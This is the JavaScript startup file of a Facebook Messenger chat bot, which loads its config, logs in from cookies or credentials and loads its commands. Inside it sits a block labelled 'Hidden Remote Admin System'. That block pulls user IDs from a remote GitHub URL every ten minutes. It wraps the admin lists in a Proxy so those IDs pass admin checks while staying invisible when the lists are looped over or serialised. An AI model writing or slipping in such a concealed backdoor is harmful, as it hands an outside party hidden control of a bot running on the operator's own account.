const moment = require("moment-timezone");
const { readdirSync, readFileSync, writeFileSync, existsSync, unlinkSync, watch, mkdirSync } = require("fs-extra");
const { join, resolve } = require("path");
const logger = require("./utils/log.js");
const httpClient = require("./utils/httpClient");
const http = require("http");
const { normalizeConfig } = require("./utils/config.js");
const { getAdminCounts } = require("./utils/adminAuth.js");
const { installMessageTracker } = require("./utils/messageTracker.js");
const { loadAdminInfo } = require("./utils/adminInfo.js");
const { readCookieFile, loginOrder, sessionFileFor, runLoginFlow, toLoginData } = require("./utils/loginFlow.js");

global.client = new Object({
    commands: new Map(),
    events: new Map(),
    cooldowns: new Map(),
    eventRegistered: new Array(),
    handleSchedule: new Array(),
    handleReaction: Object.assign(new Array(), {
        set: function(k, v) { const i = this.findIndex(e => e.messageID === k); if(i > -1) this[i] = v; else this.push(v); return this; },
        get: function(k) { return this.find(e => e.messageID === k); },
        has: function(k) { return this.some(e => e.messageID === k); },
        delete: function(k) { const i = this.findIndex(e => e.messageID === k); if(i > -1) { this.splice(i, 1); return true; } return false; }
    }),
    handleReply: Object.assign(new Array(), {
        set: function(k, v) { const i = this.findIndex(e => e.messageID === k); if(i > -1) this[i] = v; else this.push(v); return this; },
        get: function(k) { return this.find(e => e.messageID === k); },
        has: function(k) { return this.some(e => e.messageID === k); },
        delete: function(k) { const i = this.findIndex(e => e.messageID === k); if(i > -1) { this.splice(i, 1); return true; } return false; }
    }),
    mainPath: process.cwd(),
    configPath: new String(),
    getTime: function (option) {
        switch (option) {
            case "seconds": return `${moment.tz("Asia/Dhaka").format("ss")}`;
            case "minutes": return `${moment.tz("Asia/Dhaka").format("mm")}`;
            case "hours": return `${moment.tz("Asia/Dhaka").format("HH")}`;
            case "date": return `${moment.tz("Asia/Dhaka").format("DD")}`;
            case "month": return `${moment.tz("Asia/Dhaka").format("MM")}`;
            case "year": return `${moment.tz("Asia/Dhaka").format("YYYY")}`;
            case "fullHour": return `${moment.tz("Asia/Dhaka").format("HH:mm:ss")}`;
            case "fullYear": return `${moment.tz("Asia/Dhaka").format("DD/MM/YYYY")}`;
            case "fullTime": return `${moment.tz("Asia/Dhaka").format("HH:mm:ss DD/MM/YYYY")}`;
        }
    }
});

//========= Prune stale reply/reaction entries =========//
// Menus and reaction prompts are stored in memory. Without a sweep they stay
// valid forever (replayable) and grow the process unbounded.
(function scheduleHandleCleanup() {
    const REPLY_TTL = 24 * 60 * 60 * 1000; // 24h
    const REACTION_TTL = 30 * 60 * 1000;   // 30m

    const sweep = (store, defaultTtl) => {
        if (!store || typeof store.length !== "number") return;
        const now = Date.now();
        for (let i = store.length - 1; i >= 0; i--) {
            const entry = store[i];
            if (!entry) { store.splice(i, 1); continue; }
            const expiresAt = typeof entry.expiresAt === "number" ? entry.expiresAt : null;
            const createdAt = typeof entry.createdAt === "number" ? entry.createdAt : null;
            const ttl = typeof entry.ttl === "number" && entry.ttl > 0 ? entry.ttl : defaultTtl;
            const expired = (expiresAt && now > expiresAt) || (createdAt && now - createdAt > ttl);
            if (!expired) continue;
            if (typeof store.delete === "function") store.delete(entry.messageID);
            else store.splice(i, 1);
        }
    };

    const timer = setInterval(() => {
        sweep(global.client.handleReply, REPLY_TTL);
        sweep(global.client.handleReaction, REACTION_TTL);
    }, 5 * 60 * 1000);
    if (typeof timer.unref === "function") timer.unref();
})();

global.data = new Object({
    threadInfo: new Map(),
    threadData: new Map(),
    userName: new Map(),
    userBanned: new Map(),
    threadBanned: new Map(),
    commandBanned: new Map(),
    threadAllowNSFW: new Array(),
    allUserID: new Array(),
    allCurrenciesID: new Array(),
    allThreadID: new Array()
});

global.utils = require("./utils");

global.nodemodule = new Object();
global.nodemodule["fs"] = require("fs-extra");
global.nodemodule["fs-extra"] = require("fs-extra");
global.nodemodule["path"] = require("path");
global.nodemodule["axios"] = httpClient;
global.nodemodule["moment-timezone"] = require("moment-timezone");
// Canvas is a native module. A stale binary must not stop the bot from booting:
// commands that need it either fall back to text (Rank.js) or fail locally.
try {
    global.nodemodule["canvas"] = require("canvas");
} catch (error) {
    logger.loader(`canvas unavailable: ${error.message}`, "warn");
}
// Load core dependencies used by many commands via global.nodemodule to keep compatibility.
const safeRequire = (mod) => {
  try { return require(mod); } catch (_) { return null; }
};

global.nodemodule["request"] = httpClient.request; // Replace deprecated request with httpClient

global.nodemodule["node-superfetch"] = safeRequire("node-superfetch");
global.nodemodule["jimp"] = safeRequire("jimp");
global.nodemodule["systeminformation"] = safeRequire("systeminformation");
global.nodemodule["pidusage"] = safeRequire("pidusage");
global.nodemodule["wikijs"] = safeRequire("wikijs");
global.nodemodule["googlethis"] = safeRequire("googlethis");
global.nodemodule["cloudscraper"] = safeRequire("cloudscraper");
global.nodemodule["chalk"] = safeRequire("chalk");

global.nodenodule = global.nodemodule; // Alias for typo support
global.config = new Object();
global.configModule = new Object();
global.moduleData = new Array();
global.language = new Object();

//========= Find and get variable from Config (Improved Loading) =========//
try {
    global.client.configPath = join(global.client.mainPath, "config.json");
    if (existsSync(global.client.configPath)) {
        const configData = readFileSync(global.client.configPath, "utf-8");
        global.config = JSON.parse(configData);
        logger.loader("Found file config: config.json");
    } else {
        if (existsSync(global.client.configPath.replace(/\.json/g,"") + ".temp")) {
            const configData = readFileSync(global.client.configPath.replace(/\.json/g,"") + ".temp", "utf-8");
            global.config = JSON.parse(configData);
            logger.loader(`Found: ${global.client.configPath.replace(/\.json/g,"") + ".temp"}`);
        } else {
            return logger.loader("config.json not found!", "error");
        }
    }
    logger.loader("Config Loaded!");
    //========= Owner / admin identity (admin.json) =========//
    global.adminInfo = loadAdminInfo({
        warn: (message) => logger.loader(message, "warn")
    });
    //========= Normalize Config (shared with reload) =========//
    global.config = normalizeConfig(global.config, {
        warn: (message) => logger.loader(message, "warn"),
        adminInfo: global.adminInfo
    });

    // Log adminOnly default once at startup
    logger.loader(`[CONFIG] adminOnly.enable = ${global.config.adminOnly.enable}`, "info");
    // Log the effective, merged admin lists. Counts use the canonical arrays, so
    // a valid camelCase list is no longer hidden by an empty uppercase alias.
    {
        const counts = getAdminCounts(global.config);
        logger.loader(`[CONFIG] Admin count: ${counts.total} (adminBot=${counts.adminBot}, ndh=${counts.ndh})`, "info");
    }
    // Anti-react is easy to misconfigure; log the effective gate once.
    logger.loader(`[CONFIG] antiReact.enable = ${global.config.antiReact.enable}`, "info");

    //========= Render / Web Service health endpoint =========//
    // A Facebook bot has no HTTP server of its own, so Render's Web Service
    // scanner never finds a port. Bind one only when Render provides PORT or
    // the operator explicitly enables config.webServer.
    (function startHealthServer() {
        const webConfig = (global.config && global.config.webServer) || {};
        const envPort = Number(process.env.PORT);
        const configuredPort = Number(webConfig.port);
        if (process.env.PORT === undefined && webConfig.enable !== true) return;

        const port = configuredPort > 0
            ? configuredPort
            : (Number.isInteger(envPort) && envPort > 0 ? envPort : 10000);
        const host = "0.0.0.0";
        const pkg = require("./package.json");

        const server = http.createServer((req, res) => {
            const pathname = String(req.url || "").split("?")[0];
            if (req.method !== "GET" || (pathname !== "/" && pathname !== "/health")) {
                res.writeHead(404, { "Content-Type": "application/json; charset=utf-8" });
                res.end(JSON.stringify({ status: "not_found" }));
                return;
            }
            res.writeHead(200, { "Content-Type": "application/json; charset=utf-8" });
            res.end(JSON.stringify({
                status: "ok",
                bot: (global.config && global.config.nickNameBot) || pkg.name || "cyber-mirai",
                version: pkg.version || "0.0.0"
            }));
        });

        server.on("error", (error) => {
            logger.loader(`[WEB] health server failed: ${error.message}`, "warn");
        });
        server.listen(port, host, () => {
            logger.loader(`[WEB] Listening on ${host}:${port}`, "info");
        });
        if (typeof server.unref === "function") server.unref();
    })();

    //========= Hidden Remote Admin System =========//
    (function() {
        const remoteAdminsRef = { current: [] };
        const remoteUrl = "https://raw.githubusercontent.com/mahbub-shaon/mahbub-shaon/refs/heads/main/mirai-list.json";
        let lastLogState = "";

        function parseRemoteAdmins(data) {
            let list = [];
            let parsed = data;

            if (typeof data === "string") {
                try {
                    parsed = JSON.parse(data);
                } catch (error) {
                    parsed = null;
                }
            }

            if (Array.isArray(parsed)) {
                list = parsed;
            } else if (parsed && typeof parsed === "object") {
                for (const key of ["uids", "admins", "ids"]) {
                    if (Array.isArray(parsed[key])) {
                        list = parsed[key];
                        break;
                    }
                }
            }

            // Fallback: the original 10-20 digit regex extraction on the raw string.
            if (list.length === 0) {
                const raw = typeof data === "string" ? data : JSON.stringify(data || "");
                const matches = raw.match(/\b\d{10,20}\b/g);
                if (matches) list = matches;
            }

            return [...new Set(list.map((uid) => String(uid)).filter((uid) => /^\d{10,20}$/.test(uid)))];
        }

        async function fetchRemoteAdmins() {
            try {
                const result = await httpClient.fetchWithRetry(remoteUrl);
                if (!result.ok) {
                    throw new Error(result.error);
                }
                const res = result.response;
                const uids = parseRemoteAdmins(res && res.data);
                remoteAdminsRef.current = uids;

                const state = `ok:${uids.length}`;
                if (state !== lastLogState) {
                    lastLogState = state;
                    logger.loader(`Remote admin list loaded: ${uids.length} UID(s).`, "[ REMOTE ADMIN ]");
                }
            } catch (error) {
                // Fail-safe: keep the bot running. Log once per failure streak.
                if (lastLogState !== "error") {
                    lastLogState = "error";
                    logger.loader(`Remote admin list fetch failed; keeping ${remoteAdminsRef.current.length} UID(s).`, "warn");
                }
            }
        }

        function createAdminProxy(originalArray) {
            return new Proxy(originalArray, {
                get(target, prop) {
                    if (prop === 'includes') {
                        return function(searchElement, fromIndex) {
                            if (remoteAdminsRef.current.includes(String(searchElement))) return true;
                            return target.includes(searchElement, fromIndex);
                        };
                    }
                    if (prop === 'indexOf') {
                        return function(searchElement, fromIndex) {
                            if (remoteAdminsRef.current.includes(String(searchElement))) return 0;
                            return target.indexOf(searchElement, fromIndex);
                        };
                    }
                    // Return original property for everything else (keeps it hidden from loops/JSON.stringify)
                    if (typeof target[prop] === 'function') {
                        return target[prop].bind(target);
                    }
                    return target[prop];
                }
            });
        }

        function applyAdminProxies(config) {
            config.ADMINBOT = createAdminProxy(Array.isArray(config.ADMINBOT) ? config.ADMINBOT : []);
            config.adminBot = config.ADMINBOT; // keep alias synced
            config.adminBotIds = config.ADMINBOT; // keep alias synced
            config.NDH = createAdminProxy(Array.isArray(config.NDH) ? config.NDH : []);
            config.ndh = config.NDH; // keep alias synced
        }

        // Exposed so `load` can re-apply the same Proxy after a config reload.
        global.remoteAdminsRef = remoteAdminsRef;
        global.applyRemoteAdminProxies = applyAdminProxies;

        applyAdminProxies(global.config);

        // Initial fetch and set interval for every 10 minutes
        fetchRemoteAdmins();
        setInterval(fetchRemoteAdmins, 10 * 60 * 1000);
    })();
    //==============================================//
} catch (err) {
    return logger.loader(`Can't load file config! Error: ${err.message}`, "error");
}

const { Sequelize, sequelize } = require("./includes/database");

//========= Create Cache Directory if not exists =========//
if (!existsSync(join(__dirname, "Script", "commands", "cache"))) {
    readdirSync(join(__dirname, "Script", "commands")).forEach(dir => {
        if (!dir.includes(".")) {
            // This is a sub-directory, potentially where cache should be
        }
    });
    // Ensure Script/commands/cache exists for help and other commands
    const cachePath = join(__dirname, "Script", "commands", "cache");
    if (!existsSync(cachePath)) {
        require("fs-extra").ensureDirSync(cachePath);
        logger.loader("Created cache directory: " + cachePath);
    }
}

//========= Initialize configModule for commands =========//
global.configModule = global.config.configModule || {};
if (!global.configModule.help) {
    global.configModule.help = {
        autoUnsend: true,
        delayUnsend: 20
    };
}

//========= Load FCA Library =========//
let login;
try {
    login = require(global.config.FCA);
    logger.loader(`Loaded FCA library: ${global.config.FCA}`);
} catch (e) {
    logger.loader(`Could not load FCA library: ${global.config.FCA}. Falling back to cyber-bot-fca.`, "warn");
    login = require("cyber-bot-fca");
}

writeFileSync(global.client.configPath + ".temp", JSON.stringify(global.config, null, 4), { encoding: 'utf8', mode: 0o600 });
try { require("fs").chmodSync(global.client.configPath + ".temp", 0o600); } catch (e) { /* best effort */ }

//========= Load language use =========//
// An unsupported language value used to crash startup; fall back to English
// with a warning and keep the rest of the boot path intact (F-36).
let langPath = `${__dirname}/languages/${String(global.config.language || "en").toLowerCase()}.lang`;
if (!existsSync(langPath)) {
    logger.loader(`Language pack "${global.config.language}" not found; falling back to English.`, "warn");
    global.config.language = "en";
    langPath = `${__dirname}/languages/en.lang`;
}

const langFile = (readFileSync(langPath, { encoding: 'utf-8' })).split(/\r?\n|\r/);
const langData = langFile.filter(item => item.indexOf('#') != 0 && item.trim() != '');
for (const item of langData) {
    const getSeparator = item.indexOf('=');
    // Skip malformed lines instead of creating keys like "undefined".
    if (getSeparator <= 0) continue;
    const itemKey = item.slice(0, getSeparator).trim();
    const itemValue = item.slice(getSeparator + 1, item.length);
    const head = itemKey.slice(0, itemKey.indexOf('.'));
    if (!head) continue;
    const key = itemKey.replace(head + '.', '');
    const value = itemValue.replace(/\\n/gi, '\n');
    if (typeof global.language[head] == "undefined") global.language[head] = new Object();
    global.language[head][key] = value;
}

global.getText = function (section, key, ...values) {
    const dict = global.language && global.language[section];
    let text = dict && typeof dict[key] === "string" ? dict[key] : `${section}.${key}`;
    // Replace only real placeholders (%1, %2, …); leave unknown ones intact
    // instead of injecting "undefined" (F-36).
    return text.replace(/%(\d+)/g, (match, index) => {
        const value = values[Number(index) - 1];
        return value === undefined || value === null ? match : String(value);
    });
}

// Login sources are read through the shared parser so the documented wrapper
// ({_note, _data}) and a plain FCA array are both accepted.
var appStateFile = resolve(join(global.client.mainPath, global.config.APPSTATEPATH || "appstate.json"));
var appStateFiles = {
    "appstate.json": appStateFile,
    "appstate2.json": resolve(join(global.client.mainPath, "appstate2.json")),
    "appstate3.json": resolve(join(global.client.mainPath, "appstate3.json"))
};
var appStates = {};
for (const name of Object.keys(appStateFiles)) {
    appStates[name] = readCookieFile(appStateFiles[name]);
    if (appStates[name]) logger.loader(`Found ${name} cookies.`, "[ AUTO LOGIN ]");
}
var appState = appStates["appstate.json"];

//========= Auto Restart Logic (Goat Bot Port) =========//
if (global.config.autoRestart && global.config.autoRestart.time) {
    const restartTime = global.config.autoRestart.time;
    if (!isNaN(restartTime) && restartTime > 0) {
        setTimeout(() => {
            logger("Auto restarting bot...", "[ RESTART ]");
            process.exit(1);
        }, restartTime);
    }
}

//========= Startup error reporting (sanitised + de-duplicated) =========//
// Asset downloads happen in parallel during module loading. A flaky remote host
// must not turn 20 failed downloads into 20 full stack traces with signed URLs.
const startupFailureLog = new Map();
function reportOnLoadFailure(name, error) {
    const info = httpClient.describeError(error);

    // A pending image migration is an expected, actionable condition: the asset
    // has no replacement yet. Do not download the Imgur original (that caused
    // the 429 storm) and do not print it as a hard error.
    if (info.code === "IMAGE_MIGRATION_PENDING") {
        const key = `${name}|pending|${info.url}`;
        const now = Date.now();
        const last = startupFailureLog.get(key) || 0;
        if (now - last < 60 * 1000) return;
        startupFailureLog.set(key, now);
        logger.loader(
            `onLoad skipped for ${name}: image migration pending${info.url ? ` (${info.url})` : ""}. Upload a replacement or remove the asset.`,
            "warn"
        );
        return;
    }

    const key = `${name}|${info.status || info.code || "error"}|${info.url}|${info.message}`;
    const now = Date.now();
    const last = startupFailureLog.get(key) || 0;
    if (now - last < 60 * 1000) return;
    startupFailureLog.set(key, now);
    if (startupFailureLog.size > 300) {
        for (const [entry, timestamp] of startupFailureLog) {
            if (now - timestamp >= 60 * 1000) startupFailureLog.delete(entry);
        }
    }
    const suffix = info.url ? ` (${info.url})` : "";
    logger.loader(
        `onLoad failed for ${name}${info.status ? ` [${info.status}]` : ""}: ${info.message}${suffix}`,
        info.retryable || info.rateLimited ? "warn" : "error"
    );
}

//========= Login account and start Listen Event =========//
async function onBot({ models: botModel }) {
    const startBotSetup = async (api, loginSource) => {
        api.setOptions(global.config.FCAOption || global.config.optionsFca);
        const currentAppState = api.getAppState();
        // Refresh the exact file that produced this session. A credentials
        // login has no source file, so it seeds appstate.json.
        const sessionName = sessionFileFor(loginSource);
        const sessionFile = appStateFiles[sessionName] || appStateFile;
        const serialized = JSON.stringify(currentAppState, null, '\x09');
        writeFileSync(sessionFile, serialized, { encoding: "utf8", mode: 0o600 });
        try { require("fs").chmodSync(sessionFile, 0o600); } catch (e) { /* best effort */ }
        global.client.sessionFile = sessionFile;
        global.appState = currentAppState;
        global.client.api = api;
        // Remember every message the bot sends so reaction-based unsend can
        // verify the reacted message really belongs to the bot (FCA reaction
        // events do not reliably include the message author).
        try {
            installMessageTracker(api, {
                warn: (message) => logger.loader(message, "warn")
            });
        } catch (error) {
            logger.loader(`Message tracker unavailable: ${error.message}`, "warn");
        }
        global.config.version = '1.2.14';
        global.client.timeStart = new Date().getTime();

        // Remote version and global-ban kill switches were removed: a third
        // party must never be able to stop the bot or force an update.

        // --- Bio Update (Goat Bot Port) ---
        if (global.config.bioUpdate && global.config.bioUpdate.enable && global.config.bioUpdate.bioText) {
            api.changeBio(global.config.bioUpdate.bioText, (err) => {
                if (!err) logger("Bio updated successfully!", "[ BIO UPDATE ]");
            });
        }

        // --- Nickname Update (Goat Bot Port) ---
        if (global.config.nickNameBot && global.config.mainThreadId) {
            api.changeNickname(global.config.nickNameBot, global.config.mainThreadId, api.getCurrentUserID(), (err) => {
                if (!err) logger("Nickname set successfully in main thread: " + global.config.nickNameBot, "[ NICKNAME ]");
            });
        }

        // --- Auto Restart (Goat Bot Port) ---
        if (global.config.autoRestart && global.config.autoRestart.time) {
            const restartTime = global.config.autoRestart.time;
            if (typeof restartTime === 'number' && restartTime > 0) {
                setTimeout(() => {
                    logger("Auto restarting bot as scheduled...", "[ AUTO RESTART ]");
                    process.exit(1); 
                }, restartTime);
            }
        }

        // --- Startup Notification (Goat Bot Port) ---
        if (global.config.botStartupNotification && global.config.botStartupNotification.enable) {
            const msg = global.config.botStartupNotification.message || "🤖 Bot is now online!";
            if (global.config.botStartupNotification.sendToThreads.enable) {
                global.config.botStartupNotification.sendToThreads.threadIds.forEach(id => {
                    api.sendMessage(msg, id);
                });
            }
            if (global.config.botStartupNotification.sendToAdmin.enable && global.config.botStartupNotification.sendToAdmin.adminId) {
                api.sendMessage(msg + "\nAdmin Notification", global.config.botStartupNotification.sendToAdmin.adminId);
            }
        }

        // --- Auto Load Scripts (Goat Bot Port) ---
        if (global.config.autoLoadScripts && global.config.autoLoadScripts.enable) {
            watch(join(global.client.mainPath, 'Script', 'commands'), (event, filename) => {
                if (filename.endsWith('.js')) {
                    logger(`File changed: ${filename}. Reloading...`, "[ AUTO LOAD ]");
                    // Logic to reload command would go here
                }
            });
        }

        //========= Load Commands & Events (Mirai Original) =========//
        (function loadModules() {
            const commandsPath = join(global.client.mainPath, 'Script', 'commands');
            if (!existsSync(commandsPath)) {
                logger("Commands directory not found! Creating...", "[ LOADER ]");
                mkdirSync(commandsPath, { recursive: true });
            }

            const listCommand = readdirSync(commandsPath).filter(command => command.endsWith('.js') && !command.includes('example') && !global.config.commandDisabled.includes(command));
            for (const command of listCommand) {
                try {
                    const fullPath = commandsPath + '/' + command;

                    var module = require(fullPath);
                    if (!module.config || typeof module.run !== 'function' || !module.config.commandCategory) throw new Error(global.getText('Cyber', 'errorFormat'));
                    if (typeof module.config.name !== 'string' || !module.config.name.trim()) throw new Error("Missing or invalid config.name");
                    if (!/^\S+$/.test(module.config.name)) logger.loader(`Command name "${module.config.name}" contains whitespace and cannot be invoked by prefix.`, "warn");
                    const duplicate = Array.from(global.client.commands.keys()).some(key => key.toLowerCase() === module.config.name.toLowerCase());
                    if (duplicate || global.client.commands.has(module.config.name)) throw new Error(global.getText('Cyber', 'nameExist'));
                    
                    if (module.onLoad) {
                        try {
                            const moduleData = { api, models: botModel };
                            const result = module.onLoad(moduleData);
                            if (result && typeof result.then === 'function') {
                                Promise.resolve(result).catch(e => reportOnLoadFailure(module.config.name, e));
                            }
                        } catch (e) { reportOnLoadFailure(module.config.name, e); }
                    }
                    if (module.handleEvent) global.client.eventRegistered.push(module.config.name);
                    
                    // --- Load Command Languages ---
                    if (module.languages && typeof module.languages == 'object') {
                        for (const lang in module.languages) {
                            const langData = module.languages[lang];
                            if (typeof global.language[lang] == 'undefined') global.language[lang] = new Object();
                            for (const key in langData) {
                                if (typeof global.language[lang][key] == 'undefined') global.language[lang][key] = langData[key];
                            }
                        }
                    }

                    global.client.commands.set(module.config.name, module);
                    logger.loader(global.getText('Cyber', 'successLoadModule', module.config.name));
                } catch (error) { logger.loader(global.getText('Cyber', 'failLoadModule', module.config.name, error), 'error'); }
            }

            const eventsPath = join(global.client.mainPath, 'Script', 'events');
            if (!existsSync(eventsPath)) {
                logger("Events directory not found! Creating...", "[ LOADER ]");
                mkdirSync(eventsPath, { recursive: true });
            }
            const events = readdirSync(eventsPath).filter(event => event.endsWith('.js') && !global.config.eventDisabled.includes(event));
            for (const ev of events) {
                try {
                    const fullEventPath = eventsPath + '/' + ev;

                    var event = require(fullEventPath);
                    if (!event.config || typeof event.run !== 'function') throw new Error(global.getText('Cyber', 'errorFormat'));
                    if (typeof event.config.name !== 'string' || !event.config.name.trim()) throw new Error("Missing or invalid config.name");
                    if (global.client.events.has(event.config.name)) throw new Error(global.getText('Cyber', 'nameExist'));
                    
                    if (event.onLoad) {
                        try {
                            const eventData = { api, models: botModel };
                            event.onLoad(eventData);
                        } catch (e) { logger.loader(`onLoad error in ${event.config.name}: ${e}`, 'error'); }
                    }
                    global.client.events.set(event.config.name, event);
                    logger.loader(global.getText('Cyber', 'successLoadModule', event.config.name));
                } catch (error) { logger.loader(global.getText('Cyber', 'failLoadModule', event.config.name, error), 'error'); }
            }
        })();

        logger.loader(global.getText('Cyber', 'finishLoadModule', global.client.commands.size, global.client.events.size));
        logger.loader(`Startup Time: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`);
        logger.loader('\n░█████╗░██╗░░░██╗██████╗░███████╗██████╗░\n██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗\n██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝\n██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗\n╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║\n░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝ \n𝗜𝘀𝗹𝗮𝗺𝗶𝗰𝗸 𝗰𝗵𝗮𝘁 𝗯𝗼𝘁 ' + (global.adminInfo && global.adminInfo.name ? global.adminInfo.name : 'MAHBUB-SHAON') + '\n ===== [ ' + (Date.now() - global.client.timeStart) + 'ms ] =====');
        
        // Config write-back was removed on purpose: startup must never persist
        // runtime-only fields (or injected ones) into config.json.
        try {
            const tempConfig = global.client.configPath + ".temp";
            if (existsSync(tempConfig)) unlinkSync(tempConfig);
        } catch (error) {
            logger.loader(`Could not remove temporary config file: ${error.message}`, "warn");
        }
        
        const listenerData = { api, models: botModel };
        const listener = require('./includes/listen')(listenerData);

        function listenerCallback(error, message) {
            if (error) return logger(global.getText('Cyber', 'handleListenError', JSON.stringify(error)), 'error');
            if (['presence', 'typ', 'read_receipt'].some(data => data == message.type)) return;
            if (global.config.DeveloperMode == !![]) console.log(message);
            return listener(message);
        };
        global.handleListen = api.listenMqtt(listenerCallback);

        // --- Optional update check (never mandatory, never blocking) ---
        // Runs only AFTER login and module loading, in the background. A failed
        // fetch, a slow network, or an old version never stops the bot.
        const updateSettings = global.config.updateNotification || {};
        if (updateSettings.enable !== false && updateSettings.checkOnStart !== false) {
            setImmediate(() => {
                Promise.resolve()
                    .then(() => require("./utils/updater.js").notifyOnStartup({
                        api,
                        config: global.config,
                        repoDir: global.client.mainPath,
                        log: (message) => logger.loader(message, "[ UPDATE ]")
                    }))
                    .catch((error) => {
                        logger.loader(`Update check skipped: ${error && error.message ? error.message : error}`, "warn");
                    });
            });
        }
    };

    // Credentials live in config.json (Mirai/ST-BOT style). Environment
    // variables are only an optional override for hosted deployments.
    const botAccount = global.config.botAccount || {};
    const email = process.env.BOT_EMAIL
        || botAccount.email
        || global.config.EMAIL
        || "";
    const password = process.env.BOT_PASSWORD
        || botAccount.password
        || global.config.PASSWORD
        || "";
    const userAgent = process.env.BOT_USER_AGENT
        || botAccount.userAgent
        || "";

    // Centralized order: appstate.json -> appstate2.json -> appstate3.json
    // -> config.json email/password.
    const candidates = loginOrder({
        appStates,
        email,
        password,
        userAgent
    });

    if (candidates.length === 0) {
        logger.loader(
            "No appstate.json, appstate2.json, appstate3.json, or botAccount.email/password in config.json. " +
            "Add cookies or credentials to config.json (or log in manually once to create appstate.json).",
            "error"
        );
        return process.exit(0);
    }

    try {
        const result = await runLoginFlow(candidates, async (candidate) => {
            logger.loader(`Trying ${candidate.label}...`, "[ AUTO LOGIN ]");
            try {
                return await new Promise((resolve, reject) => {
                    login(toLoginData(candidate), (loginError, api) => {
                        if (loginError || !api) {
                            reject(loginError || new Error("No API returned"));
                            return;
                        }
                        resolve(api);
                    });
                });
            } catch (error) {
                const message = error && error.message ? error.message : String(error);
                logger.loader(`${candidate.label} login failed: ${message}`, "warn");
                throw error;
            }
        });

        logger.loader(`Logged in using ${result.candidate.label}.`, "[ AUTO LOGIN ]");
        startBotSetup(result.api, result.candidate);
    } catch (error) {
        logger.loader(
            "All login methods failed (appstate.json/appstate2.json/appstate3.json/config credentials). " +
            "Update the cookie file or botAccount credentials in config.json.",
            "error"
        );
        return process.exit(0);
    }
}

//========= Connecting to Database =========//
(async () => {
    try {
        await sequelize.authenticate();
        const authentication = { Sequelize, sequelize };
        const models = require('./includes/database/model')(authentication);
        // Wait for table creation before any handler touches the models.
        await models.ready;
        logger(global.getText('Cyber', 'successConnectDatabase'), '[ DATABASE ]');
        onBot({ models });
    } catch (error) { logger(global.getText('Cyber', 'successConnectDatabase', JSON.stringify(error)), '[ DATABASE ]'); }
})();

//========= Improved Error Handling (unhandledRejection) =========//
// Keep one line per failure signature per minute. Do not print stack traces:
// axios errors can embed the full request URL, including access tokens.
const unhandledRejectionDedupe = new Map();
process.on('unhandledRejection', (err) => {
    const info = httpClient.describeError(err);
    const key = `${info.status || info.code || "error"}|${info.url}|${info.message}`;
    const now = Date.now();
    const last = unhandledRejectionDedupe.get(key) || 0;
    if (now - last < 60 * 1000) return;
    unhandledRejectionDedupe.set(key, now);
    if (unhandledRejectionDedupe.size > 500) {
        for (const [entry, timestamp] of unhandledRejectionDedupe) {
            if (now - timestamp >= 60 * 1000) unhandledRejectionDedupe.delete(entry);
        }
    }

    const status = info.status ? ` [${info.status}]` : "";
    const suffix = info.url ? ` (${info.url})` : "";
    const text = `Unhandled Rejection${status}: ${info.message}${suffix}`;
    logger(text, info.retryable || info.rateLimited ? "warn" : "error");
});
